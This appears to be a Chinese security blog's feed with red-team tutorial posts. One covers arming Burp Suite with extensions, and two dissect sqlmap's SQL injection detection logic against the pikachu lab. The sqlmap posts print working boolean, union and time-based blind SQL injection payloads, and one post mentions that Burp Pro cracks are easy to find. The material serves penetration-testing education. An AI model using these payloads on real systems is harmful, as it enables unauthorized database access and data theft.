href=&#34;https://portswigger.net/burp/extender/api/burp/IBurpCollaboratorInteraction.html&#34;&gt;IBurpCollaboratorInteraction&lt;/a&gt;&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#fetchInfiltratorInteractionsFor(java.lang.String)&#34;&gt;fetchInfiltratorInteractionsFor&lt;/a&gt;(java.lang.String payload) This method is used to retrieve interactions made by Burp Infiltrator instrumentation resulting from a single payload that was generated for this context.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.lang.String&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#generatePayload(boolean)&#34;&gt;generatePayload&lt;/a&gt;(boolean includeCollaboratorServerLocation) This method is used to generate new Burp Collaborator payloads.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.lang.String&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#getCollaboratorServerLocation()&#34;&gt;getCollaboratorServerLocation&lt;/a&gt;() This method is used to retrieve the network location of the Collaborator server.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps88.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（三）——武装你的Burpsuite（上）</title>
      <link>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%8A/</link>
      <pubDate>Wed, 16 Dec 2020 11:04:32 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%8A/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Burpsuite作为抓包利器，深受安全人员的喜爱。免费的community版本只有非常少的一些功能，而很多功能都在Pro版中，虽然基础功能都能实现，但是Burpsuite就是以强大的模块化拓展功能著称，就像常见的Goby, CS 和蚁剑等工具都非常适合模块化的拓展开发。如此强大的神器在不同版本究竟有什么差异呢，我们先来官网看一看。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps38.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以看到企业版卖到了3999刀一年，而正常情况下的专业版也是399刀一年。其中专业版的功能支持多了Web vulnerability scanner、Advanced manual tools和Essential manual tools。&lt;/p&gt;&#xA;&lt;p&gt;下面是官网给出的功能解释截图，大家自己看一下就好，我懒得翻译了，顺便说一句：一定要好好学英语。我是不会告诉你们我是好几个技术项目的翻译支持的（有合作意向的大佬除外，兼职翻译欢迎小窗。）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps39.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps40.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps41.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;破解方法网上一搜一大堆，在这里就不多BB了，当然你也可以选择支持正版。下面我们进入正题，开始本篇的重点部分：武装Burpsuite。&lt;/p&gt;&#xA;&lt;p&gt;本篇的介绍环境如下：&lt;/p&gt;&#xA;&lt;p&gt;Burpsuite Pro 2020.7&lt;/p&gt;&#xA;&lt;p&gt;Java 14.0.2 2020-07-14&lt;/p&gt;&#xA;&lt;p&gt;因为新版的Burp好像不支持Java8了，之前用的BP1.7版本还是用的Java8。新版本的Burpsuite反正我觉得界面长的还可以。主界面如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps42.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;新增的功能是内置的浏览器，不用再像以前一样测试的时候浏览器和Burp疯狂切换了。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps43.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Burpsuite的武装主要是支持拓展的部分也就是模块化的拓展，在Extender模块部分可以看到当前已安装的拓展，为了演示需要我这边找了一个白板Burp&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps44.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Burp的插件支持本地加载和商店直接下载，我们先来看看商店中的实用拓展：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps45.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;以第一个插件为例，讲讲如何从商店中安装插件，首先选中插件，将右侧栏的滚动条拖到底可以看到install按钮&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps46.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;点击install后就开始了安装&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps47.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装成功后可看到installed栏下勾上了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps48.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;不过这玩意的效果好像比较难演示，效果演示我们就放到后面的内容中去。知道了插件的基础安装过程，接下来就是武装的过程了。&lt;/p&gt;&#xA;&lt;p&gt;以下介绍的插件为我自己Burp中安装的一些常用插件，在渗透测试或挖洞时能让工作方便不少。&lt;/p&gt;&#xA;&lt;h2 id=&#34;hae&#34;&gt;&lt;em&gt;HaE&lt;/em&gt;&lt;/h2&gt;&#xA;&lt;p&gt;2024补充，Key师傅开发的插件，&lt;del&gt;有非常多的策略可以用于各种测试&lt;/del&gt;，总之就是非常牛逼！！！牛逼！！还有不断更新的&lt;a href=&#34;https://raw.githubusercontent.com/gh0stkey/HaE/gh-pages/Rules.yml&#34;&gt;规则库&lt;/a&gt;，&#xA;使用效果如下（图是网上偷的，自己挖的洞太牛逼了就不放了）：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/1362876-20240520150051446-910956326.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;autorize&#34;&gt;&lt;em&gt;Autorize&lt;/em&gt;&lt;/h2&gt;&#xA;&lt;p&gt;这是一款强大的自动化越权测试工具，在商店中就可以下载。但是这款工具在安装过程中就要开始踩坑了，并不是直接安装就可以的，为了演示还特地起了一台没环境的虚拟机。&lt;/p&gt;&#xA;&lt;p&gt;在这款工具的安装中我们可以看到需要安装Jython，因为该插件通过Python来进行支持，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps49.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;首先去https://www.jython.org/download.html下载jython并安装&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps50.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后在Option选项中选择刚刚安装的jython路径&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps51.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这时候在进入商店。刷新列表后即可进行安装&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps52.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装成功后即可在选项卡中看到Autorize&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps53.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在拦截数据包部分可以看到右键选项多了发送到Autorize&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps54.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;测试成功的项会变绿，即存在越权&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps55.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;autorepeater&#34;&gt;&lt;em&gt;AutoRepeater&lt;/em&gt;&lt;/h2&gt;&#xA;&lt;p&gt;这款工具和上述的差不多，都可以直接在Burp的插件商店里找到。安装完成后的效果和之前的差不多，会多一个选项卡&lt;/p&gt;&#xA;&lt;p&gt;可以把这个插件当做高级版的Repeater&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps56.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;同样通过右键发送到插件&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps57.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以在右边自定义一些过滤规则，在大批量发包的时候就不用一个个手工替换会方便很多。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps58.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;并且在多样化的规则中，这个工具同样可以测试越权，支持替换的cookie部分很多&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps59.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（二）——深入理解sqlmap(下)</title>
      <link>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8B/</link>
      <pubDate>Thu, 10 Dec 2020 02:11:09 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8B/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;在上篇中我们分析了sqlmap的部分检测逻辑，接下来介绍之前没讲完的部分，并且填上tamper这个坑。&lt;/p&gt;&#xA;&lt;p&gt;我们继续来分析盲注的逻辑，上篇分析的布尔型盲注，本篇分析时间盲注。&lt;/p&gt;&#xA;&lt;p&gt;还是拿靶场说事，先进行正常输入，可以看到相应时间，并且返回为I don’t care who you are.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps1.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;再来随便测试几个其他的输入，返回均为I don’t care who you are.即使输入特殊字符产生了错误也不会改变，在靶场中我们知道这是一个时间型盲注，但是在实战中可能往往想不到，那如何来验证是时间型盲注呢，这就需要用到sleep函数，sleep函数用于使查询延迟执行，我们可以在navicat中做样例演示，可以看到同样的一条select 123;语句执行时间不同&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps2.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;所以针对时间型盲注，要判断我们的输入是否执行，只需要加上sleep函数即可，在浏览器的开发人员工具的网络选项卡中，通过瀑布流的形式我们可以看到请求的时间，以下为输入lucy’and sleep (5)#的执行结果，可以看到执行时间超过了五秒&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps3.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;那是否所有的操作都会延迟呢，我们来试试输入一串明显报错的payload，在跟上了一串的单引号后可以看到请求时间明显缩短，说明payload未执行。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps4.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;根据之前布尔盲注的经验，我们同样可以进行判断，通过if语句判断为真才执行sleep语句，效果如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps5.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们所使用的payload为lucy&amp;rsquo; and if ((substr(version(),1,1))=&amp;lsquo;5&amp;rsquo;,sleep(5),null)#&lt;/p&gt;&#xA;&lt;p&gt;sqlmap中的时间盲注就比较简单了，代码如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps6.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这边看似简单是因为sqlmap使用了响应延迟判断技术，该种技术使用了前文提到的高斯分布，高斯分布可以识别一个响应是否与普通响应产生于一种机制。在sqlmap的xml文件中包含了各种攻击向量，其中常见的向量为&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps7.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们在案例中的测试也使用了其中一个向量，成功的向量如下图所示&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps8.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来我们具体分析一下数据包，以下为攻击完整过程的截图&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps9.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来就是紧张刺激的payload分析了，看看wireshark抓到的数据包，由于之前进行了大量其他测试，我们只需要分析time-based Injection即可。追踪到的第一个包是eq50分片&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps10.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;url经过转码后如下：&lt;/p&gt;&#xA;&lt;p&gt;/pikachu/vul/sqli/sqli_blind_t.php?name=123&amp;rsquo; AND (SELECT 1671 FROM (SELECT(SLEEP(5)))GSuc) AND &amp;lsquo;sRRR&amp;rsquo;=&amp;lsquo;sRRR&amp;amp;submit=查询&lt;/p&gt;&#xA;&lt;p&gt;此时控制台输出进行了两次询问，因为sqlmap疑似发现存在注入&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps11.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在这之前还有两次和上述相同的发包，应该是用于响应检测。之后就是一系列UNION select的探测，对应的是包含了orderby等参数，与控制台对应输出相同，即1-20列探测。&lt;/p&gt;&#xA;&lt;p&gt;从77组开始请求地址改变，根据之前的分析此时应该进入了误报检测&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps12.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;以下记录为77开始的payload&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 3753 FROM (SELECT(SLEEP(5-(IF(57=57,0,5)))))Ndjp) AND &amp;#39;&lt;/span&gt;HxIh&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;HxIh&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 5365 FROM (SELECT(SLEEP(5-(IF(57=65,0,5)))))irpj) AND &amp;#39;&lt;/span&gt;YVSA&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;YVSA&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 7844 FROM (SELECT(SLEEP(5-(IF(57=98,0,5)))))lPgR) AND &amp;#39;&lt;/span&gt;YJgx&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;YJgx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 9479 FROM (SELECT(SLEEP(5-(IF(98=65,0,5)))))ZaRe) AND &amp;#39;&lt;/span&gt;kXSW&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;kXSW&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 6042 FROM (SELECT(SLEEP(5-(IF(65=65,0,5)))))OReg) AND &amp;#39;&lt;/span&gt;EOyg&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;EOyg&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 9179 FROM (SELECT(SLEEP(5-(IF(98 65,0,5)))))GkMV) AND &amp;#39;&lt;/span&gt;vZOZ&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;vZOZ&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而从85组开始又出现了新的变化&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（二）——深入理解sqlmap(上)</title>
      <link>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8A/</link>
      <pubDate>Wed, 02 Dec 2020 08:54:33 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8A/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;上一篇文章我们写了Nmap的分析与改造，本篇将继续分析炙手可热的工具sqlmap。这篇文章介绍的修改的东西不多，针对sqlmap的分析较多。剖析了sqlmap的大部分功能点和所有的检测逻辑，同时还会讲到tamper的分析以及tamper的编写。由于篇幅较长，为了避免大家看着难受，准备分为上下两篇来写。&lt;/p&gt;&#xA;&lt;p&gt;首先我们通过靶场环境构造漏洞场景，靶场为pikachu，github地址为：&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/zhuifengshaonianhanlu/pikachu&#34;&gt;https://github.com/zhuifengshaonianhanlu/pikachu&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;进入存在注入漏洞的页面&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps1.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进行抓包&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps2.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;丢进sqlmap可以看到能跑出结果&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps3.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进行一次完整的过程时监听流量并筛选&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps4.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在流量中我们可以很明显地发现会产生一长串的请求，筛选一下POST请求就能看到发送的payload&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps5.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这是简单的sqlmap发包内容，我们继续深入。&lt;/p&gt;&#xA;&lt;p&gt;很多人可能只了解了sqlmap的用法，甚至都不了解用法，参数只会-u -r &amp;ndash;level –risk几个，偶尔看了大佬的文章知道了&amp;ndash;tamper但是并不了解原理。接下来就给大家从多个方面来解析一下sqlmap这款神器。&lt;/p&gt;&#xA;&lt;p&gt;首先来看看针对靶场进行测试时的输出&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps6.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;第一行进行了包格式判断，如果无法识别将直接弹出错误并推出；接下来进行了连接测试，测试到目标的连接情况；然后进行WAF和IPS检测；再判断目标是否稳定；之后进行参数的动态性检测，启发式参数（xss等）测试；之后就开始了对包中可能存在的注入点的检测。&lt;/p&gt;&#xA;&lt;p&gt;我们对sqlmap的代码进行跟踪，首先第一环节为连接测试部分，对应代码在checks.py文件中&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps7.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;判断目标连接存活后开始进入下一环节，IPS和WAF的探测，核心代码也位于checks.py中，可以看到其中参考了http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps8.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;上面的参考链接是一个Nmap的脚本，也是我们上一篇文章中所说的，不过上一篇文章没有对NSE脚本的开发做深入介绍（下次一定补上。下次一定！）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;先来看一下脚本，我们发现主要是通过如下定义的两个攻击向量来进行检测的&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps10.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;上述的攻击向量包含了大多数常见的攻击类型，可以看到有目录穿越，敏感文件读取，SQL注入，PHP代码执行，XSS等方式，通常这几种payload会触发几乎所有防护软件的策略。可以看到在sqlmap中，payload也做了定义，定义在/lib/core/settings.py文件中，跟踪变量后可以看到其中的payload，与NSE脚本中的攻击向量相差无几。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps11.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;判断完WAF后就是对稳定性的检测，代码还是在checks.py中&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps12.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;该方式主要通过请求时间判断，在开头的注释中写道两次请求页面，判断不同请求的时间，而这个时间变量在跟踪后得到DELAY值超过0.5时即返回不稳定&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps13.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;启发式注入检测处于heuristicCheckSqlInjection方法中，启发式注入过程中，payload生成是由,&amp;rsquo;&amp;quot;().六种字符随机组成的长度为10的字符串，同时满足&amp;rsquo;和&amp;quot;都只有一个。启发式注入的目的就是让Web应用报错，如果Web应用开启了错误回显，就可以快速识别DBMS（正则匹配）。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps14.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来针对具体场景进行分析，我们在该案例之前的靶场中，具有如下显示，可以看到正常发包时正常回显，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps15.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;输入and 1=1以及and 1=2的测试判断是否存在注入&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps16.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps17.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续输入payload，进行列数判断&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps18.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps19.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;通过union select 1,2判断输出位置&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps20.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进一步获取数据（省略了爆表列名和字段名的操作）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps21.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;该种方式为union注入，是sqlmap中判断较为复杂的一种，因为脚本需要完成order by探测列数，select 判断列数，union select 1,2,&amp;hellip;判断输出位置，我们从代码来看sqlmap的UNION select检测逻辑，在checks.py中&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps22.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;跟进函数后发现检测文件位于/lib/techniques/union中&lt;/p&gt;&#xA;&lt;p&gt;列数判断，即order by判断&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps23.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;之后进行select null判断列数，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps24.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在进行该判断时经查sqlmap使用了网页相似度对比技术和高斯分布&lt;/p&gt;&#xA;&lt;p&gt;select null列数探测技术在进行时，会首先指定列数猜测过程中的最大值与最小值（指定列数 最少/最小值 为1，最多/最大值 为10），sqlmap会同时发送10个数据包，包含1个NULL至10个NULL，取回10个包的响应后进行网页相似度分析，并获取网页相似度数值（共10个，非True/False）。在这10个数值中，如果select 